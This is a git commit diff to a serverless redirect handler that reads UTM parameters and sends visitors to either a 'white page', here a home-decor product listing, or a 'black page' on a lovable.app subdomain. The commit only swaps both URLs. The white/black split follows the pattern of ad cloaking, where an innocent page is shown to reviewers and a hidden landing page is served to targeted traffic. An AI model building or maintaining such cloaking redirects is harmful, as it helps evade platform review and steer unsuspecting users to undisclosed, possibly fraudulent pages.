64c3b88af181ece3c6c797e4a60e1541d9e62d77
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-21 16:01:45 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://arkcolourdesign.com/products/bunny-keyring";
-    const blackPageURL = "https://instentquzzz.lovable.app/";
+    const whitePageURL = "https://allencozyhavenstore.com/collections/home-decor-collection-handpicked-by-experts/products/fashion-couple-deer-sculptures-home-decor-collectible-figurines-wedding-gifts-office-bookself-ornaments-reindeer-statues";
+    const blackPageURL = "https://ubuzznotifier.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
